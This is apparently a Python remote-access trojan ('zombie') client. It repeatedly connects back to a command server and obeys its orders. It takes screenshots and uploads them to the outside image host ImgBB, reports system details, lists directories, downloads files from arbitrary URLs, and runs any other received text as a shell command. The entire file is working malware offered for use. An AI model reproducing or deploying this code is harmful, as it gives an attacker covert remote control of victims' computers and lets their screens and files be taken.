# zombie.py
import socket
import subprocess
import os
import pyautogui
import requests
import time
from pathlib import Path
import base64
import platform
import urllib.request

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9999
IMGBB_API_KEY = "YOUR_API_KEY_HERE"  

def get_downloads_folder():
    """Returns the path to the Downloads folder."""
    return str(Path.home() / "Downloads")

def take_screenshot(filename):
    """Takes a screenshot and saves it to the specified filename."""
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)

def encode_image_to_base64(filename):
    """Encodes the image to a Base64 string."""
    with open(filename, "rb") as f:
        return base64.b64encode(f.read()).decode('utf-8')

def upload_image_to_imgbb(encoded_image):
    """Uploads the Base64-encoded image to ImgBB and returns the image URL."""
    url = "https://api.imgbb.com/1/upload"
    payload = {
        "key": IMGBB_API_KEY,
        "image": encoded_image,
        "expiration": 60 * 60  # 1 hour
    }
    response = requests.post(url, data=payload)
    if response.status_code == 200:
        return response.json()["data"]["url"]
    else:
        raise Exception(f"Failed to upload image: {response.content}")

def get_system_info():
    """Returns basic system information."""
    system_info = f"""
    System: {platform.system()}
    Node Name: {platform.node()}
    Release: {platform.release()}
    Version: {platform.version()}
    Machine: {platform.machine()}
    Processor: {platform.processor()}
    """
    return system_info

def list_files(directory):
    """Lists files in the specified directory."""
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except Exception as e:
        return f"[!] Error listing files: {e}"

def download_file(url):
    """Downloads a file from the specified URL."""
    try:
        filename = url.split("/")[-1]  # Get the file name from the URL
        filepath = os.path.join(get_downloads_folder(), filename)
        urllib.request.urlretrieve(url, filepath)
        return f"File downloaded: {filepath}"
    except Exception as e:
        return f"[!] Error downloading file: {e}"

def connect_to_server():
    """Tries to connect to the server with reconnection logic."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            print("[*] Connected to the server.")
            return sock  # Return the connected socket
        except (ConnectionRefusedError, socket.error) as e:
            print(f"[!] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)  # Wait before trying to reconnect

def main():
    while True:
        zombie_socket = connect_to_server()

        try:
            while True:
                command = zombie_socket.recv(1024).decode()

                if command.lower() == "exit":
                    print("[*] Received exit command. Attempting to reconnect...")
                    break  # Break the inner loop to reconnect

                elif command.lower() == "screenshot":
                    downloads_folder = get_downloads_folder()
                    screenshot_path = os.path.join(downloads_folder, f"screenshot_{int(time.time())}.png")
                    print(f"[*] Taking screenshot and saving to {screenshot_path}...")
                    take_screenshot(screenshot_path)

                    print("[*] Uploading screenshot to ImgBB...")
                    encoded_image = encode_image_to_base64(screenshot_path)
                    image_url = upload_image_to_imgbb(encoded_image)

                    zombie_socket.sendall(image_url.encode())
                    os.remove(screenshot_path)  # Clean up local file
                    print("[*] Screenshot uploaded and local file deleted.")

                elif command.lower() == "sysinfo":
                    print("[*] Sending system information...")
                    sys_info = get_system_info()
                    zombie_socket.sendall(sys_info.encode())

                elif command.lower().startswith("listfiles"):
                    directory = command.split(" ")[1] if len(command.split(" ")) > 1 else get_downloads_folder()
                    print(f"[*] Listing files in directory: {directory}...")
                    files = list_files(directory)
                    zombie_socket.sendall(files.encode())
                
                elif command.lower().startswith("help"):
                    print("Kitory's guide")
                    print("https://guns.lol/kitoryyy")
                    print("listfiles - shows the files in a directory")
                    print("sysinfo - shows the system info about the zombie pc")
                    print("screenshot - makes a screenshot using imgdb and gives you the link to it")

                elif command.lower().startswith("download"):
                    # Extract the URL from the command
                    url = command.split(" ")[1]
                    print(f"[*] Downloading file from URL: {url}...")
                    result = download_file(url)
                    zombie_socket.sendall(result.encode())

                else:
                    # Execute shell command
                    output = subprocess.getoutput(command)
                    if not output:
                        output = "[*] Command executed with no output."
                    zombie_socket.sendall(output.encode())

        except (ConnectionResetError, BrokenPipeError):
            print("[!] Connection lost. Attempting to reconnect...")
            continue  # Retry the outer while loop to reconnect

        except Exception as e:
            print(f"[!] Error: {e}")

        finally:
            zombie_socket.close()

if __name__ == "__main__":
    main()
